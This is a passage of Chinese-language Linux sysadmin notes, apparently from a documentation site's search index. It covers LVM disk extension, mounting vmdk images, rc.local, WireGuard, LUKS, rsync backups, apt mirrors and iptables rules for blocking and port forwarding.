( logical / physical ) : 512 bytes / 512 bytes I / O size ( minimum / optimal ) : 512 bytes / 512 bytes root @docker : / d # pvcreate / dev / sda sda sda1 sda2 sda3 sda4 root @docker : / d # pvcreate / dev / sda4 Physical volume \"/dev/sda4\" successfully created . root @docker : / d # vgdisplay --- Volume group --- VG Name ubuntu - vg System ID Format lvm2 Metadata Areas 1 Metadata Sequence No 3 VG Access read / write VG Status resizable MAX LV 0 Cur LV 1 Open LV 1 Max PV 0 Cur PV 1 Act PV 1 VG Size < 49.00 GiB PE Size 4.00 MiB Total PE 12543 Alloc PE / Size 12543 / < 49.00 GiB Free PE / Size 0 / 0 VG UUID FJI08W - C0Db - dXmu - WPyq - Zlr9 - Lejq - xadlCk root @docker : / d # vgextend ubuntu - vg / dev / sda4 Volume group \"ubuntu-vg\" successfully extended root @docker : / d # pvscan PV / dev / sda3 VG ubuntu - vg lvm2 [ <49.00 GiB / 0 free ] PV / dev / sda4 VG ubuntu - vg lvm2 [ <150.00 GiB / <150.00 GiB free ] Total : 2 [ 198.99 GiB ] / in use : 2 [ 198.99 GiB ] / in no VG : 0 [ 0 ] root @docker : / d # lvextend / dev / ubuntu - vg / ubuntu - lv / dev / sda4 Size of logical volume ubuntu - vg / ubuntu - lv changed from < 49.00 GiB ( 12543 extents ) to 198.99 GiB ( 50942 extents ). Logical volume ubuntu - vg / ubuntu - lv successfully resized . root @docker : / d # resize2fs / dev / ubuntu - vg / ubuntu - lv resize2fs 1.44.1 ( 24 - Mar - 2018 ) Filesystem at / dev / ubuntu - vg / ubuntu - lv is mounted on / ; on - line resizing required old_desc_blocks = 7 , new_desc_blocks = 25 The filesystem on / dev / ubuntu - vg / ubuntu - lv is now 52164608 ( 4 k ) blocks long . VMWare\u65b0\u6dfb\u52a0\u4e00\u5757\u786c\u76d8\u6269\u5bb9\u6839\u76ee\u5f55 \u00b6 @TAG \u865a\u62df\u673a \u53c2\u8003\u8fd9\u4e24\u7bc7\uff1a https://www.cyberciti.biz/tips/vmware-add-a-new-hard-disk-without-rebooting-guest.html https://www.unixmen.com/add-a-new-disk-to-lvm/ root@docker3:/d# for i in /sys/class/scsi_host/*; do echo \"- - -\" > ${ i } /scan; done root@docker3:/d# fdisk -l Disk /dev/sdb: 1 TiB, 1099511627776 bytes, 2147483648 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes root@docker3:/d# fdisk /dev/sdb Welcome to fdisk (util-linux 2.31.1). Changes will remain in memory only, until you decide to write them. Be careful before using the write command. Device does not contain a recognized partition table. Created a new DOS disklabel with disk identifier 0x3289a390. Command (m for help): n Partition type p primary (0 primary, 0 extended, 4 free) e extended (container for logical partitions) Select (default p): Using default response p. Partition number (1-4, default 1): First sector (2048-2147483647, default 2048): Last sector, +sectors or +size{K,M,G,T,P} (2048-2147483647, default 2147483647): Created a new partition 1 of type 'Linux' and of size 1024 GiB. Command (m for help): t Selected partition 1 Hex code (type L to list all codes): 8e Changed type of partition 'Linux' to 'Linux LVM'. Command (m for help): w The partition table has been altered. Calling ioctl() to re-read partition table. Syncing disks. root@docker3:/d# pvcreate /dev/sdb1 Physical volume \"/dev/sdb1\" successfully created. root@docker3:/d# vgextend ubuntu-vg /dev/sdb1 Volume group \"ubuntu-vg\" successfully extended root@docker3:/d# pvscan PV /dev/sda3 VG ubuntu-vg lvm2 [ <199.00 GiB / 0 free] PV /dev/sdb1 VG ubuntu-vg lvm2 [<1024.00 GiB / <1024.00 GiB free] Total: 2 [1.19 TiB] / in use: 2 [1.19 TiB] / in no VG: 0 [0 ] root@docker3:/d# lvextend -l +100%FREE /dev/ubuntu-vg/ubuntu-lv Size of logical volume ubuntu-vg/ubuntu-lv changed from <199.00 GiB (50943 extents) to 1.19 TiB (313086 extents). Logical volume ubuntu-vg/ubuntu-lv successfully resized. root@docker3:/d# resize2fs /dev/ubuntu-vg/ubuntu-lv resize2fs 1.44.1 (24-Mar-2018) Filesystem at /dev/ubuntu-vg/ubuntu-lv is mounted on /; on-line resizing required old_desc_blocks = 25, new_desc_blocks = 153 The filesystem on /dev/ubuntu-vg/ubuntu-lv is now 320600064 (4k) blocks long. root@docker3:/d# df -h /dev/mapper/ubuntu--vg-ubuntu--lv 1.2T 170G 986G 15% / \u6302\u8f7d\u591a\u4e2avmdk\u4e2d\u7684LVM\u5206\u533a \u00b6 @TAG \u865a\u62df\u673a \u79bb\u7ebf\u64cd\u4f5c \u53c2\u8003\uff1a https://superuser.com/questions/1376690/how-to-mount-an-lvm-volume-from-a-dd-raw-vmdk-image \u8bd5\u8fc7\u7528windows\u76847z\u76f4\u63a5\u6253\u5f00\u538b\u7f29\u5305\uff0c\u53ea\u80fd\u770b\u5230LVM\u6216\u8005\u591a\u4e2aimg\u6587\u4ef6\uff0c\u4e0d\u80fd\u8df3\u8fc7\u89e3\u538b\u6b65\u9aa4\uff0c\u6240\u4ee5\u8fd8\u662f\u5728linux\u4e0a\u6302\u8f7d\u5427 \u5047\u8bbe\u6709\u4e09\u4e2avmdk\u6587\u4ef6\u9700\u8981\u6302\u8f7d\uff0c\u5f97\u5230\u7684lvm\u662f /dev/ubuntu-vg/ubuntu-lv \uff0c\u53ea\u8bfb\u6302\u8f7d\u5230 /mnt \u9700\u8981 apt install -y kpartx \u6302\u8f7d mount.sh: 1 2 3 4 5 6 7 #!/bin/bash kpartx -a -v disk1.vmdk kpartx -a -v disk2.vmdk kpartx -a -v disk3.vmdk sleep 2 pvscan mount -o ro /dev/ubuntu-vg/ubuntu-lv /mnt \u53d6\u6d88\u6302\u8f7d umount.sh: 1 2 3 4 5 6 7 #!/bin/bash umount /mnt lvchange -an /dev/ubuntu-vg/ubuntu-lv vgchange -an /dev/ubuntu-vg kpartx -d disk1.vmdk kpartx -d disk2.vmdk kpartx -d disk3.vmdk \u542f\u7528rc.local \u00b6 \u53c2\u8003 https://www.linuxbabe.com/linux-server/how-to-enable-etcrc-local-with-systemd \u786e\u8ba4\u6709\u6ca1\u6709\u542f\u7528rc.local: systemctl status rc-local.service \u5982\u679c\u6709\u7eff\u8272\u7684 Active: active (exited) \u51fa\u73b0\u5c31\u662f\u5df2\u7ecf\u542f\u7528 nano /etc/systemd/system/rc-local.service printf '%s\\n' '#!/bin/bash' 'exit 0' | sudo tee -a /etc/rc.local chmod +x /etc/rc.local systemctl enable rc-local [Unit] Description = /etc/rc.local Compatibility ConditionPathExists=/etc/rc.local [Service] Type = forking ExecStart=/etc/rc.local start TimeoutSec=0 StandardOutput=tty RemainAfterExit=yes SysVStartPriority=99 [Install] WantedBy = multi-user.target apt\u7981\u7528Translation \u00b6 apt update\u7684\u65f6\u5019\u53d1\u73b0\u4e00\u5806\u7ffb\u8bd1\u7684\u6761\u76ee\uff0c\u4e0d\u60f3\u770b\u5230\u8fd9\u4e9b \u521b\u5efa/etc/apt/apt.conf.d/99translations Acquire::Languages \"none\"; \u5f00\u673a\u81ea\u542f\u52a8wireguard \u00b6 systemctl enable wg - quick @ wg0 . service systemctl daemon - reload service wg - quick @ wg0 start service wg - quick @ wg0 status \u4fee\u590d\u5931\u8d25\u7684do-release-upgrade \u00b6 \u53c2\u8003\uff1a https://www.kingsware.de/2019/01/05/repair-a-damaged-package-system-after-ubuntu-dist-upgrade/ \u53ef\u80fd\u7684\u539f\u56e0\u662f\u4f7f\u7528\u4e86ppa\u6e90\uff0c\u800c\u65b0\u7684\u53d1\u884c\u7248\u91cc\u8fd9\u4e9b\u8f6f\u4ef6\u5305\u5df2\u7ecf\u8fdb\u5165\u5b98\u65b9\u6e90\u9020\u6210\u51b2\u7a81 apt update apt upgrade apt dist-upgrade apt install -f dpkg --configure -a apt autoremove \u5982\u679c\u4f60\u9700\u8981\u7981\u7528ppa\u6e90\uff0c\u4f60\u53ef\u4ee5\u76f4\u63a5\u53bb\u5220\u9664 /etc/apt/sources.list.d \u7684\u6587\u4ef6\uff0c\u6216\u8005\uff1a add-apt-repository --remove ppa:PPA_REPOSITORY_NAME/PPA-NAME \u89e3\u51b3wireguard \u5185\u6838\u6a21\u5757\u7f16\u8bd1\u5931\u8d25 \u00b6 \u62a5\u9519\u4fe1\u606f error: \u2018const struct ipv6_stub\u2019 has no member named \u2018ipv6_dst_lookup_flow\u2019 \u67e5\u5230\u8fd9\u4e9b\u94fe\u63a5\uff1a https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=959157 \u5b98\u65b9\u5df2\u7ecf\u7ed9\u51fa\u4e86patch\uff1a https://git.zx2c4.com/wireguard-linux-compat/commit/?id=4602590adee92557847e61c8cd14445d35fbfa2e \u4f46\u662f\u6211\u5df2\u7ecf\u4ece\u6700\u65b0git\u4e0b\u8f7d\uff0c\u8fd9\u4e2apatch\u662f\u5df2\u7ecf\u6253\u4e86\u7684\uff0c\u8fd8\u662f\u540c\u6837\u7684\u62a5\u9519 \u770bpatch\u53d1\u73b0\u8fd9\u4e2a\u6539\u52a8\u5c31\u662f\u5728\u5224\u65ad\u5185\u6838\u7248\u672c\uff0c\u5982\u679c\u7b26\u5408\u7279\u5b9a\u7248\u672c\u5c31\u5f15\u5165 ipv6_dst_lookup_flow \u7684#define\u8bed\u53e5 \u4f46\u4f30\u8ba1\u8fd9\u4e2a\u7248\u672c\u5224\u65ad\u662f\u4e0d\u5b8c\u5907\u7684\uff0c\u6b63\u597d\u6f0f\u6389\u4e86\u5f53\u524d\u7684\u5185\u6838\u7248\u672c\uff0c\u6240\u4ee5\u89e3\u51b3\u65b9\u6848\u5f88\u7b80\u5355\uff1a\u5f3a\u884c\u628a\u8fd9\u4e2adefine\u52a0\u5165\u5373\u53ef git clone https://git.zx2c4.com/wireguard-linux-compat cd wireguard-linux-compat/src echo \"#define ipv6_dst_lookup_flow(a, b, c, d) ipv6_dst_lookup(a, b, &dst, c) + (void *)0 ?: dst\" >> compat/compat.h make make install LUKS \u00b6 \u6559\u7a0b\uff1a https://www.cyberciti.biz/security/howto-linux-hard-disk-encryption-with-luks-cryptsetup-command/ \u9a8c\u8bc1\u5bc6\u94a5\u662f\u5426\u6b63\u786e \u00b6 cryptsetup luksDump \u8bbe\u5907 cryptsetup luksOpen --test-passphrase --key-slot 0 \u8bbe\u5907 && echo ok cryptsetup luksOpen --test-passphrase --key-file \u5bc6\u94a5\u6587\u4ef6 --key-slot 1 \u8bbe\u5907 && echo ok ntp\u7684\u66ff\u4ee3 \u4f7f\u7528http\u66f4\u65b0\u65f6\u95f4 \u00b6 \u5728ntp\u670d\u52a1\u5668\u8bbf\u95ee\u4e0d\u4e86\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528http\u534f\u8bae\u7684Date\u5b57\u6bb5\u6765\u83b7\u53d6\u65f6\u95f4 \u53c2\u8003\uff1a https://superuser.com/questions/307158/how-to-use-ntpdate-behind-a-proxy 1 2 #!/bin/bash date -s \" $( curl -i \"http://www.google.com/\" 2 >/dev/null | grep -E '^[[:space:]]*[dD]ate:' | sed 's/^[[:space:]]*[dD]ate:[[:space:]]*//' | head -1l | awk '{print $1, $3, $2, $5 ,\"GMT\", $4 }' | sed 's/,//' ) \" \u4f7f\u7528rsync\u5907\u4efd\u5168\u76d8 \u00b6 \u53c2\u8003\uff1a \u4e3b\u8981\u53c2\u6570\u6765\u81ea https://github.com/laurent22/rsync-time-backup https://ostechnix.com/backup-entire-linux-system-using-rsync/ \u4e0d\u8981\u8de8\u8fc7mount\u8fb9\u754c\u7528 -xx https://superuser.com/questions/626141/rsync-recursive-on-same-mount-only \u663e\u793a\u8fdb\u5ea6\u7528 --info=progress2 https://www.cyberciti.biz/faq/show-progress-during-file-transfer/ rsync --info=progress2 -D --numeric-ids --links --hard-links --itemize-changes --times --recursive --perms --owner --group --stats --human-readable -xx / /target/ \u5c0f\u6587\u4ef6\u592a\u591a\u4e0d\u5efa\u8bae\u4f7f\u7528rsync-time-backup\uff0c\u4f1a\u4ea7\u751f\u5927\u91cf\u7684\u786c\u94fe\u63a5\uff0c\u5360\u636e\u5927\u91cfbtrfs metadata\u7a7a\u95f4 \u5907\u4efd\u8fc7\u7a0b\u4e2d\u663e\u793a\u7684\u7406\u89e3\uff1a https://unix.stackexchange.com/questions/215271/understanding-the-output-of-info-progress2-from-rsync xfr#495 \u8868\u793a\u5f53\u524d\u6b63\u5728\u4f20\u8f93\u7b2c495\u4e2a\u6587\u4ef6 ir-chk=1020/3825 \u5df2\u7ecf\u77e5\u9053\u67093825\u4e2a\u6587\u4ef6\uff0c\u5176\u4e2d1020\u4e2a\u9700\u8981\u68c0\u67e5\u76ee\u6807\u4f4d\u7f6e\u7684\u6587\u4ef6\u662f\u5426\u4e00\u81f4","title":"Linux-setup"},{"location":"Linux-setup/#linux","text":"\u672c\u6587\u6863\u4e3aLinux\u670d\u52a1\u5668\u7684\u914d\u7f6e\u65b9\u9762\u7684\u7b14\u8bb0\uff0cLinux\u76f8\u5173\u7b14\u8bb0\u8fd8\u6709\uff1a Linux\u547d\u4ee4\u884c\u64cd\u4f5c\u6280\u5de7 SSH\u8fdc\u7a0b\u767b\u5f55 Linux\u5907\u4efd TOC:","title":"Linux\u7cfb\u7edf\u914d\u7f6e"},{"location":"Linux-setup/#_1","text":"","title":"\u5982\u4f55\u7ffb\u5899"},{"location":"Linux-setup/#shadowsocksprivoxyhttp-proxy","text":"\u4ee3\u7801\u53c2\u89c1 ssprivoxy.txt","title":"\u90e8\u7f72shadowsocks\u5ba2\u6237\u7aef\uff0c\u5e76\u90e8\u7f72Privoxy\u63d0\u4f9bhttp proxy"},{"location":"Linux-setup/#ip","text":"vim /etc/network/interfaces # \u5199\u5165\u4ee5\u4e0b\u5185\u5bb9\uff0c\u8bf7\u81ea\u884c\u66ff\u6362xx\u90e8\u5206 iface eth0 inet static address 10 .xx.xx.13 #\u4f60\u9700\u8981\u8bbe\u7f6e\u7684IP netmask 255 .255.255.0 #\u5b50\u7f51\u63a9\u7801 network 10 .xx.xx.0 broadcast 10 .xx.xx.255 gateway 10 .xx.xx.254 #\u7f51\u5173 dns-nameservers 10 .10.0.21 #dns\u670d\u52a1\u5668 # \u6309Esc, :wq\u9000\u51fa\u4fdd\u5b58 service networking restart ifconfig eth0 10 .xx.xx.13 netmask 255 .255.255.0 up route add default eth0 #\u8def\u7531\u914d\u7f6e\u4e5f\u5f88\u91cd\u8981\uff0c\u9519\u8bef\u7684\u8def\u7531\u5c06\u5bfc\u81f4\u4e0d\u80fd\u8bbf\u95ee route add default gw 10 .xx.xx.254 dev eth0 #\u8fd9\u91cc\u8bbe\u7f6e\u4e3a\u4f60\u7684\u7f51\u5173 \u6ce8\u610f\u4f7f\u7528ifconfig\u8fdb\u884cip\u7684\u4fee\u6539\u540e\uff0c\u4f1a\u4e22\u5931\u8def\u7531\u4fe1\u606f\u3001\u989d\u5916\u7684ip\u8bbe\u7f6e\uff0c\u9700\u8981\u91cd\u65b0\u914d\u7f6eroute\uff08\u6267\u884c\u4e0a\u8ff0\u4e24\u6761route\u547d\u4ee4\u5373\u53ef\uff09","title":"\u914d\u7f6e\u6709\u7ebf\u9759\u6001IP"},{"location":"Linux-setup/#dhcpiprtnetlink-answers-file-exists","text":"\u4e4b\u524d\u5df2\u7ecf\u914d\u7f6e\u8fc7\u9759\u6001ip\uff0c\u73b0\u5728\u8981\u6539\u4e3a\u81ea\u52a8\u83b7\u53d6 dhclient eth0 \u51fa\u73b0\u62a5\u9519RTNETLINK answers: File exists\uff0c\u89e3\u51b3\u65b9\u6848\uff1a ip addr flush dev eth0","title":"\u914d\u7f6e\u4e3adhcp\u81ea\u52a8\u83b7\u53d6ip\uff0c\u89e3\u51b3RTNETLINK answers: File exists\u95ee\u9898"},{"location":"Linux-setup/#aptapt","text":"curl http://mirrors.163.com/.help/sources.list.trusty>/etc/apt/sources.list \u5982\u679c\u8fd8\u672a\u5b89\u88c5curl\uff0c\u5148\u624b\u52a8\u5199\u5165\u8fd9\u4e24\u884c\uff1a deb http://mirrors.163.com/ubuntu/ trusty main restricted universe multiverse deb http://mirrors.163.com/ubuntu/ trusty-security main restricted universe multiverse \u6ce8\uff1avim\u590d\u5236\u4e00\u884c\u7684\u547d\u4ee4\u4e3ayy\uff0c\u7c98\u8d34\u4e3ap \u6216\u8005\u901a\u8fc7sed\u66ff\u6362\uff1a sed -i 's/security.ubuntu.com/mirrors.zju.edu.cn/g' /etc/apt/sources.list sed -i 's/archive.ubuntu.com/mirrors.zju.edu.cn/g' /etc/apt/sources.list","title":"\u914d\u7f6eapt\u6e90\u4ee5\u52a0\u901f\u56fd\u5185\u73af\u5883\u4e0bapt\u901f\u5ea6"},{"location":"Linux-setup/#ip_1","text":"ifconfig eth0:233 10.xx.xx.233 netmask 255.255.255.0 up","title":"\u5355\u7f51\u5361\u83b7\u5f97\u591a\u4e2aIP"},{"location":"Linux-setup/#apt","text":"\u95ee\u9898\u63cf\u8ff0\uff1a\u670d\u52a1\u5668\u4e3aubuntu14.04\u7248\u672c\uff0c\u67d0\u4e9b\u4e0d\u660e\u64cd\u4f5c\u540e\uff0c\u65e0\u6cd5\u7528 apt-get \u5b89\u88c5\u4efb\u4f55\u4e1c\u897f > apt-get -f install Reading package lists... Done Building dependency tree Reading state information... Done Correcting dependencies... failed. The following packages have unmet dependencies: libatk1.0-0 : Depends: libglib2.0-0 ( > = 2 .41.1 ) but 2 .40.0-2 is installed libglib2.0-bin : Depends: libglib2.0-0 (= 2 .44.0-1ubuntu3 ) but 2 .40.0-2 is installed libglib2.0-dev : Depends: libglib2.0-0 (= 2 .44.0-1ubuntu3 ) but 2 .40.0-2 is installed libgtk2.0-0 : Depends: libglib2.0-0 ( > = 2 .41.1 ) but 2 .40.0-2 is installed E: Error, pkgProblemResolver::Resolve generated breaks, this may be caused by held packages. E: Unable to correct dependencies \u4ed4\u7ec6\u770b\u9519\u8bef\u8bf4\u660e\uff0clibglib2.0-bin\u8fd9\u4e2a\u8f6f\u4ef6\u5305\u8981\u6c42libglib2.0-0\u7684\u7248\u672c=2.44\u4f46\u662f\u73b0\u6709\u7684\u5b89\u88c5\u7248\u672c\u4e3a2.40 \u5728ubuntu\u7684\u8f6f\u4ef6\u5305\u5b98\u7f51\u641c\u7d22\u54af\uff1ahttps://launchpad.net/ubuntu/ \u53d1\u73b02.44\u7248\u672c\u7684\u662fvivid\u624d\u63d0\u4f9b\u7684\uff0c\u73b0\u5728\u7cfb\u7edf\u7248\u672c\u662ftrusty\uff0c\u81ea\u7136apt-get\u88c5\u4e0d\u4e86 \u89e3\u51b3\u65b9\u6848\uff1a \u627e\u5230\u62a5\u9519\u4fe1\u606f\u9700\u8981\u7684\u7cbe\u786e\u5339\u914d\u7684\u90a3\u4e2adeb\u6587\u4ef6\u4e0b\u8f7d\u54af\uff0c\u4f8b\u5982\u8fd9\u91cc\u5c31\u8981\u4e0b\u8f7d\u8fd9\u4e2a\u7248\u672c\u7684\uff1a https://launchpad.net/ubuntu/vivid/amd64/libglib2.0-0/2.44.0-1ubuntu3 \u5f97\u5230deb\u6587\u4ef6\u540e dpkg -i \u6587\u4ef6\u540d","title":"\u89e3\u51b3apt\u4f9d\u8d56\u95ee\u9898"},{"location":"Linux-setup/#note","text":"\u4e00\u822capt\u4f9d\u8d56\u51b2\u7a81\u95ee\u9898\u90fd\u662f\u7531\u4e8e\u7cfb\u7edf\u7248\u672c\u4e0e\u9700\u8981\u7684\u5305\u7684\u7248\u672c\u4e0d\u4e00\u81f4\u5bfc\u81f4\u7684\uff0c\u68c0\u67e5\u4e00\u4e0b/etc/apt/sources.list\u770b\u770b\u662f\u5426\u5339\u914d\u7cfb\u7edf\u7248\u672c\u54af \u7528apt-get\u524d\u68c0\u67e5\u4e00\u4e0bsources.list \u770b\u4e0e\u5f53\u524d lsb-release -a \u662f\u5426\u4e00\u81f4","title":"Note"},{"location":"Linux-setup/#unixbench","text":"VPS\u6027\u80fd\u6d4b\u8bd5\u5de5\u5177\uff0c\u8017\u65f6\u8f83\u957f\uff0c\u8010\u5fc3\u7b49\u5f85 curl https://codeload.github.com/kdlucas/byte-unixbench/zip/v5.1.3>UnixBench.zip unzip UnixBench.zip cd byte-unixbench-5.1.3/UnixBench # apt-get install build-essential make screen -S ub ./Run \u53c2\u8003\u6570\u636e\uff0c\u5747\u4e3a\u6700\u4f4e\u914d\u7f6e\uff1a\u4e3b\u673a\u5c4b1590.5\uff1b\u963f\u91cc\u4e911470.4\uff1b\u817e\u8baf\u4e911156.0","title":"UnixBench"},{"location":"Linux-setup/#io","text":"dd if=/dev/zero of=test bs=64k count=4k oflag=dsync dd if=/dev/zero of=test bs=8k count=256k conv=fdatasync","title":"\u786c\u76d8IO\u6027\u80fd\u6d4b\u8bd5"},{"location":"Linux-setup/#_2","text":"\u4f7f\u7528 free -h \u67e5\u770b\u53ef\u7528\u5185\u5b58\u524d\u53ef\u4ee5\u6267\u884c\u8fd9\u4e2a\u547d\u4ee4\uff0c\u67e5\u770b\u9664\u53bbbuffer\u540e\u7684\u53ef\u7528\u5185\u5b58 sync echo 3 > /proc/sys/vm/drop_caches","title":"\u6e05\u9664\u5185\u5b58\u7f13\u5b58"},{"location":"Linux-setup/#iptablesip","text":"","title":"\u4f7f\u7528iptables\u5c01ip"},{"location":"Linux-setup/#ip_2","text":"iptables -I INPUT -s 123.45.6.7 -j DROP","title":"\u5c4f\u853d\u5355\u4e2aIP"},{"location":"Linux-setup/#c","text":"iptables -I INPUT -s 123.45.6.0/24 -j DROP","title":"\u5c01C\u6bb5"},{"location":"Linux-setup/#b","text":"iptables -I INPUT -s 123.45.0.0/16 -j DROP","title":"\u5c01B\u6bb5"},{"location":"Linux-setup/#a","text":"iptables -I INPUT -s 123.0.0.0/8 -j DROP \u8bb0\u5f97 \u4fdd\u5b58 \uff1a service iptables save","title":"\u5c01A\u6bb5"},{"location":"Linux-setup/#_3","text":"\u53ea\u8981\u628a\u4e0a\u8ff0\u7684\u63d2\u5165\u89c4\u5219\u91cd\u5199\u4e00\u6b21\uff0c\u5c06\u5176\u4e2d\u7684-I\u6539\u4e3a-D\u5373\u53ef iptables -D INPUT -s IP\u5730\u5740 -j DROP \u5982\u679c\u61d2\u5f97\u91cd\u5199 \u4f60\u4e5f\u53ef\u4ee5\u5148\u5217\u4e3e\u51fa\u89c4\u5219\u6240\u5728\u7684id\uff0c\u6839\u636eid\u5220\u9664\uff1a iptables -L --line-numbers \u5047\u8bbe\u4f60\u60f3\u5220\u9664INPUT\u94fe\u7684\u7b2c3\u6761\u89c4\u5219\uff1a iptables -D INPUT 3","title":"\u5220\u9664\u4e00\u6761\u89c4\u5219"},{"location":"Linux-setup/#ip_3","text":"iptables\u7684\u63d2\u5165\u6b21\u5e8f\u5f88\u91cd\u8981\uff0c\u5148\u52a0\u5165\u7684\u4f1a\u5148\u5339\u914d\uff0c\u6240\u4ee5\u62d2\u7edd\u7b56\u7565\u5e94\u8be5\u6700\u540e\u52a0\u5165 \u4ee58888\u7aef\u53e3\u4e3a\u4f8b\uff0c\u53ea\u5141\u8bb810.77.88.99\u8fd9\u4e2aIP \u548c 10.22.33.0/24 \u8fd9\u4e2aC\u6bb5\u8bbf\u95ee\uff0c\u5176\u4ed6\u6765\u6e90\u7684\u8bbf\u95ee\u62d2\u7edd \u8fd4\u56deconnection refused iptables -A INPUT -s 10.77.88.99 -p tcp --dport 8888 -j ACCEPT iptables -A INPUT -s 10.22.33.0/24 -p tcp --dport 8888 -j ACCEPT iptables -A INPUT -p tcp --dport 8888 -j REJECT","title":"\u53ea\u5141\u8bb8\u7279\u5b9aIP\u8bbf\u95ee\u67d0\u7aef\u53e3"},{"location":"Linux-setup/#rootscreen","text":"https://www.gnu.org/software/screen/ \u590d\u5236\u76f8\u540c\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u7684screen\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u8fd0\u884c\u524d\u6307\u5b9a\u73af\u5883\u53d8\u91cf mkdir - p $ HOME /. screen export SCREENDIR =$ HOME /. screen","title":"\u65e0root\u6743\u9650\u4f7f\u7528screen"},{"location":"Linux-setup/#screen","text":"\u5217\u51fa\u5b58\u5728\u7684screen\uff1a screen -ls \u521b\u5efa\u4e00\u4e2a\u540d\u4e3aname\u7684screen\uff1a screen -S name \u4ecescreen\u8131\u79bb\uff1a \u6309Ctrl+A\u540e\u6309d \u91cd\u65b0\u8fde\u4e0a\u540d\u79f0\u4e3aname\u7684screen\uff1a screen -r name \u521b\u5efa\u4e00\u4e2ascreen\u7684\u81ea\u542f\u52a8\uff0c\u8ba9\u540e\u53f0\u8fdb\u7a0b\u83b7\u5f97tty # \u5047\u8bbe\u5199\u597d\u4e86\u4e00\u4e2a/root/code.sh vim /etc/rc.local # \u5728\u6700\u540e\u52a0\u5165\u4e00\u884c\uff0c\u5176\u4e2dNAME\u66ff\u6362\u4e3a\u81ea\u5df1\u559c\u6b22\u7684\u540d\u5b57 screen -dmS NAME /root/code.sh \u4e3e\u4e2a\u4f8b\u5b50\u2013\u76d1\u6d4b\u5916\u7f51\u80fd\u5426ping\u901a\uff0c\u5982\u679c\u4e0d\u80fd\u91cd\u8fdezjuvpn\uff1a code/pingtest.sh","title":"screen\u7684\u7528\u6cd5"},{"location":"Linux-setup/#_4","text":"@TAG \u7aef\u53e3\u8f6c\u53d1 \u6765\u81ea\uff1a https://yq.aliyun.com/wenzhang/show_25824 \u6709\u4e24\u53f0\u673a\u5668\uff0c\u5176\u4e2d\u4e00\u53f0A \u6709\u5185\u7f51\u548c\u5916\u7f51\uff0cB\u53ea\u6709\u5185\u7f51\u3002 \u76ee\u6807\uff1a \u5728\u5916\u7f51\u8bbf\u95eeA\u673a\u5668\u76842121\u7aef\u53e3\uff0c\u5c31\u76f8\u5f53\u4e8e\u8fde\u4e0a\u4e86B\u673a\u5668\u7684ftp(21)","title":"\u53cc\u7f51\u5361\u7aef\u53e3\u8f6c\u53d1\uff0c\u66b4\u9732\u5185\u7f51\u7aef\u53e3"},{"location":"Linux-setup/#_5","text":"A\u673a\u5668\u5916\u7f51IP\u4e3a 1.2.3.4(eth1) \u5185\u7f51IP\u4e3a 192.168.1.20 (eth0) B\u673a\u5668\u5185\u7f51\u4e3a 192.168.1.21","title":"\u73af\u5883\uff1a"},{"location":"Linux-setup/#_6","text":"\u9996\u5148\u5728A\u673a\u5668\u4e0a\u6253\u5f00\u7aef\u53e3\u8f6c\u53d1\u529f\u80fd echo 1 > /proc/sys/net/ipv4/ip_forward echo -e \"\\nnet.ipv4.ip_forward = 1\">>/etc/sysctl.conf sysctl -p \u7136\u540e\u5728A\u673a\u5668\u4e0a\u521b\u5efaiptables\u89c4\u5219 # \u628a\u8bbf\u95ee\u5916\u7f51 2121 \u7aef\u53e3\u7684\u5305\u8f6c\u53d1\u5230\u5185\u7f51 ftp\u670d\u52a1\u5668 iptables - t nat - I PREROUTING - d 1 . 2 . 3 . 4 - p tcp --dport 2121 -j DNAT --to 192.168.1.21:21 # \u628a\u5230\u5185\u7f51 ftp\u670d\u52a1\u5668\u7684\u5305\u56de\u6e90\u5230\u5185\u7f51\u7f51\u5361\u4e0a \uff0c\u4e0d\u7136\u5305\u53ea\u80fd\u8f6c\u5230 ftp\u670d\u52a1\u5668 \uff0c\u800c\u8fd4\u56de\u7684\u5305\u4e0d\u80fd\u5230\u8fbe\u5ba2\u6237\u7aef iptables - t nat - I POSTROUTING - d 192 . 168 . 1 . 21 - p tcp --dport 21 -j SNAT --to 192.168.1.20 # \u4fdd\u5b58\u4e00\u4e0b\u89c4\u5219 service iptables save","title":"\u5b9e\u73b0\u65b9\u6cd5\uff1a"},{"location":"Linux-setup/#_7","text":"iptables\u4e2d\u628a-I\u6539\u4e3a-D\u8fd0\u884c\u5c31\u662f\u5220\u9664\u6b64\u6761\u89c4\u5219","title":"\u53d6\u6d88\u8f6c\u53d1\u65b9\u6cd5"},{"location":"Linux-setup/#_8","text":"\u4f7f\u7528+i\u6807\u5fd7\u4f4d\u4f7f\u5f97root\u7528\u6237\u4e5f\u4e0d\u80fd\u5220\u9664/bin, /sbin, /usr/sbin, /usr/bin, /usr/local/sbin, /usr/local/bin chattr -R +i /bin /sbin /usr/sbin /usr/bin /usr/local/sbin /usr/local/bin \u8bbe\u7f6e\u540e\u65e0\u6cd5apt-get\u5b89\u88c5\u65b0\u8f6f\u4ef6\uff0c\u9700\u8981\u5148\u53d6\u6d88\u6807\u5fd7\u4f4d chattr -R -i /bin /sbin /usr/sbin /usr/bin /usr/local/sbin /usr/local/bin","title":"\u4fdd\u62a4\u91cd\u8981\u7cfb\u7edf\u6587\u4ef6\u9632\u6b62\u88ab\u5220"},{"location":"Linux-setup/#cpu","text":"\u4e00\u822c\u6211\u4f1a\u7528 top \u547d\u4ee4\uff0c\u6309 1 \u5c31\u80fd\u770b\u5230\u6bcf\u4e2aCPU\u5360\u7528\u60c5\u51b5 \u4f46\u5f53CPU\u592a\u591a\u7684\u65f6\u5019\u8fd8\u662f\u9700\u8981\u6267\u884c\u547d\u4ee4\u7684\uff1a # \u67e5\u770b\u7269\u7406 CPU\u4e2a\u6570 cat / proc / cpuinfo | grep \"physical id\" | sort | uniq | wc - l # \u67e5\u770b\u6bcf\u4e2a\u7269\u7406 CPU\u4e2dcore\u7684\u4e2a\u6570 ( \u5373\u6838\u6570 ) cat / proc / cpuinfo | grep \"cpu cores\" | uniq # \u67e5\u770b\u903b\u8f91 CPU\u7684\u4e2a\u6570 cat / proc / cpuinfo | grep \"processor\" | wc - l","title":"\u67e5\u770bCPU\u6838\u5fc3\u4e2a\u6570"},{"location":"Linux-setup/#_9","text":"useradd username -m echo username:badpassword|chpasswd 